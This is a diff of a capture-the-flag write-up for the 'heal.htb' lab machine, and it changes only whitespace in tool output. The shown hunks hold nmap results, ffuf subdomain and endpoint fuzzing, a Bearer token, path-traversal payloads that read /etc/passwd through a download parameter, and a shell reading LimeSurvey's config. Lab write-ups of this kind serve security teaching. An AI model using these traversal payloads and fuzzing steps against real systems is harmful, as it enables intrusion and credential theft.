@@ -9,21 +9,21 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 
 ```
-PORT   STATE SERVICE REASON  VERSION
-22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
+| 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
-|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
+| 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
-80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
+80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 | http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
+|_ Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Did not follow redirect to http://heal.htb/
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
@@ -50,29 +50,29 @@ First thing I'd like doing, is fuzzing for subdomains and hidden directories, le
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://heal.htb/ -H "Host: FUZZ.heal.htb" -t 200 -mc 200,301,302,403,500 -fs 178 -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://heal.htb/
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.heal.htb
+ :: Method : GET
+ :: URL : http://heal.htb/
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header : Host: FUZZ.heal.htb
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200,301,302,403,500
- :: Filter           : Response size: 178
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200,301,302,403,500
+ :: Filter : Response size: 178
 ________________________________________________
 
-api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 117ms]
+api [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 117ms]
 ```
 
 Found a subdomain, let's add it to `/etc/hosts` too and check it out:
@@ -85,27 +85,27 @@ Let's fuzz for API endpoints:
 ```
 ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://api.heal.htb/FUZZ" -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://api.heal.htb/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Method : GET
+ :: URL : http://api.heal.htb/FUZZ
+ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 40
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-download                [Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 2109ms]
+download [Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 2109ms]
 ```
 
 
@@ -147,34 +147,34 @@ After fuzzing we find the `filename` parameter, we can try fuzzing for LFI using
 ```
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://api.heal.htb/download?filename=FUZZ" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" -fs 64 -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://api.heal.htb/download?filename=FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
- :: Header           : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc
+ :: Method : GET
+ :: URL : http://api.heal.htb/download?filename=FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Header : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 64
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 40
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Response size: 64
 ________________________________________________
 
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 109ms]
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 608ms]
 /etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 2100ms]
 ../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 2102ms]
-/etc/rpc                [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 2098ms]
-/proc/meminfo           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2095ms]
+/etc/rpc [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 2098ms]
+/proc/meminfo [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2095ms]
 ```
 
 There we go, another thing I found while creating an account is there's a survey section in our profile:
@@ -190,29 +190,29 @@ Let's add it and try to fuzz:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://take-survey.heal.htb/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://take-survey.heal.htb/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://take-survey.heal.htb/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 75816, Words: 32809, Lines: 1086, Duration: 328ms]
-optin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2146ms]
-responses               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2142ms]
+ [Status: 200, Size: 75816, Words: 32809, Lines: 1086, Duration: 328ms]
+optin [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2146ms]
+responses [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2142ms]
 ```
 
 We get two, `optin` and `responses`, if we try going into `responses`, we are redirected into another site:
@@ -399,13 +399,13 @@ www-data@heal:~/limesurvey/application/config$ cat config.php
 | EXPLANATION OF VARIABLES
 | -------------------------------------------------------------------
 |
-|    'connectionString' Hostname, database, port and database type for
-|     the connection. Driver example: mysql. Currently supported:
-|                 mysql, pgsql, mssql, sqlite, oci
-|    'username' The username used to connect to the database
-|    'password' The password used to connect to the database
-|    'tablePrefix' You can add an optional prefix, which will be added
-|                 to the table name when using the Active Record class
+| 'connectionString' Hostname, database, port and database type for
+| the connection. Driver example: mysql. Currently supported:
+| mysql, pgsql, mssql, sqlite, oci
+| 'username' The username used to connect to the database
+| 'password' The password used to connect to the database
+| 'tablePrefix' You can add an optional prefix, which will be added
+| to the table name when using the Active Record class
 |
 */
 return array(
